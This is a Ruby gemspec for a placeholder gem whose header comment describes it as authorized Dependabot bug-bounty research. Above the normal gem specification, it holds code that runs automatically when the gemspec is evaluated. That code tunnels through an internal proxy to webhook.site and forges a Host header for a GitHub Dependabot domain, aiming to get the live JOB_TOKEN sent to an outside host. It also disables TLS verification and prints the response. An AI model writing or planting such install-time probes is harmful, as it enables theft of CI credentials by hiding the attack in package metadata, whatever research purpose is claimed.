# Runs at gemspec-evaluation time. Authorized security research for GitHub's
# Dependabot HackerOne bounty (bounty.github.com/targets/dependabot.html).
# Tests whether dependabot/proxy's DependabotAPIHandler can be tricked via a
# CONNECT-target vs inner-Host-header mismatch into attaching the live
# JOB_TOKEN to a request bound for a destination of our choosing. No token
# value is hardcoded or assumed; we only observe what the proxy sends.
begin
  require "socket"
  require "openssl"
  require "timeout"

  def host_confusion_probe(proxy_host, proxy_port, connect_target, forged_host, path)
    Timeout.timeout(6) do
      sock = TCPSocket.new(proxy_host, proxy_port)
      sock.write("CONNECT #{connect_target}:443 HTTP/1.1\r\nHost: #{connect_target}:443\r\n\r\n")
      connect_resp = sock.readline
      ctx = OpenSSL::SSL::SSLContext.new
      ctx.verify_mode = OpenSSL::SSL::VERIFY_NONE
      ssl = OpenSSL::SSL::SSLSocket.new(sock, ctx)
      ssl.hostname = connect_target
      ssl.connect
      req = "GET #{path} HTTP/1.1\r\nHost: #{forged_host}\r\nConnection: close\r\n\r\n"
      ssl.write(req)
      data = ssl.read(2000)
      ssl.close
      "connect_line=#{connect_resp.strip.inspect} sent_host=#{forged_host.inspect} resp_first300=#{data.to_s[0,300].inspect}"
    end
  rescue => e
    "FAILED #{e.class}: #{e.message}"
  end

  result = host_confusion_probe(
    "172.19.0.2", 1080,
    "webhook.site",
    "dependabot-actions.githubapp.com",
    "/61eb303b-510b-4c33-a552-ac87f451e6bf/host-confusion-test"
  )

  puts "==HOSTCONFUSION=="
  puts result
  puts "==HOSTCONFUSION_DONE=="
rescue => e
  warn "fingerprint error: #{e}"
end

Gem::Specification.new do |s|
  s.name        = "mygem"
  s.version     = "0.0.3"
  s.summary     = "temp research gem"
  s.authors     = ["researcher"]
  s.files       = ["lib/mygem.rb"]
  s.require_paths = ["lib"]
end
